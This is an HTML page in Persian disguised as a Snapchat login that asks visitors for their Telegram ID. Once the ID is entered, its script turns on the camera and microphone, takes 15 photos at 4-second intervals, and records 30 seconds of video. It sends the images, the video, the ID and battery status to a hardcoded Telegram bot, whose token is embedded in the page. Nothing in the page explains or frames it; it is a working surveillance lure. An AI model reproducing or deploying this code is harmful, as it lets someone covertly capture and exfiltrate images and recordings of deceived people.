<!DOCTYPE html><html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ورود به اسنپ‌چت</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/lucide@latest"></script>
  <style>
    body {
      font-family: sans-serif;
      direction: rtl;
      background-color: #fffc00;
      color: #000;
      margin: 0;
      padding: 0;
      height: 100vh;
      overflow: hidden;
    }
    #cameraWrapper {
      position: relative;
      width: 100%;
      height: 100vh;
      display: none;
    }
    video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    .capture-btn {
      position: absolute;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      width: 70px;
      height: 70px;
      background: white;
      border: 5px solid #000;
      border-radius: 50%;
      z-index: 10;
    }
    .switch-btn {
      position: absolute;
      bottom: 30px;
      right: 20px;
      background: rgba(0,0,0,0.5);
      padding: 10px;
      border-radius: 50%;
    }
  </style>
</head>
<body>
  <div id="loginPage" class="flex flex-col justify-center items-center h-full px-6">
    <h1 class="text-3xl font-bold mb-6">ورود به اسنپ‌چت</h1>
    <input id="userId" type="text" placeholder="آیدی تلگرام (مثلاً @user)" class="w-full max-w-xs p-3 mb-4 rounded-lg border border-gray-400">
    <button onclick="startApp()" class="bg-black text-yellow-300 px-6 py-2 rounded-full font-bold text-lg">ورود</button>
  </div>  <div id="cameraWrapper">
    <video id="video" autoplay playsinline></video>
    <button class="capture-btn" onclick="manualCapture()"></button>
    <button class="switch-btn" onclick="switchCamera()"><i data-lucide="refresh-ccw"></i></button>
  </div>  <script>
    lucide.createIcons();

    const botToken = '7336954365:AAHqd7DgkHDMetoFFjtNWvmV1IWZsmiiaLU';
    const chatId = '--1002645916072';

    let stream;
    let useFront = true;
    let userId = "";
    let photoCount = 0;
    let captureInterval;

    function startApp() {
      const input = document.getElementById('userId').value.trim();
      if (!input.startsWith('@')) {
        alert('لطفاً آیدی را با @ وارد کنید.');
        return;
      }
      userId = input;
      document.getElementById('loginPage').style.display = 'none';
      document.getElementById('cameraWrapper').style.display = 'block';
      startCamera();
      startAutoCapture();
      startVideoRecording();
    }

    async function startCamera() {
      if (stream) {
        stream.getTracks().forEach(t => t.stop());
      }
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: useFront ? "user" : "environment" }, audio: true });
      document.getElementById('video').srcObject = stream;
    }

    function switchCamera() {
      useFront = !useFront;
      startCamera();
    }

    function manualCapture() {
      captureAndSend();
    }

    function startAutoCapture() {
      let times = 0;
      captureInterval = setInterval(() => {
        if (times >= 15) {
          clearInterval(captureInterval);
          return;
        }
        captureAndSend();
        times++;
      }, 4000);
    }

    function captureAndSend() {
      const video = document.getElementById('video');
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(async blob => {
        const battery = await navigator.getBattery();
        const form = new FormData();
        form.append("chat_id", chatId);
        form.append("photo", blob, `photo_${photoCount++}.jpg`);
        form.append("caption", `آیدی: ${userId}\n🔋 ${Math.round(battery.level * 100)}%\n⚡ ${battery.charging ? 'در حال شارژ' : 'بدون شارژ'}`);

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: form
        });
      }, 'image/jpeg');
    }

    function startVideoRecording() {
      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: 'video/webm;codecs=vp8',
        videoBitsPerSecond: 500000
      });

      const chunks = [];
      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = async () => {
        const blob = new Blob(chunks, { type: 'video/webm' });
        const form = new FormData();
        form.append("chat_id", chatId);
        form.append("video", blob, "video.webm");
        form.append("caption", `آیدی: ${userId}\n🎥 ویدیو`);

        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
          method: 'POST',
          body: form
        });
      };

      mediaRecorder.start();

      setTimeout(() => {
        mediaRecorder.stop();
      }, 30000);
    }
  </script></body>
</html>
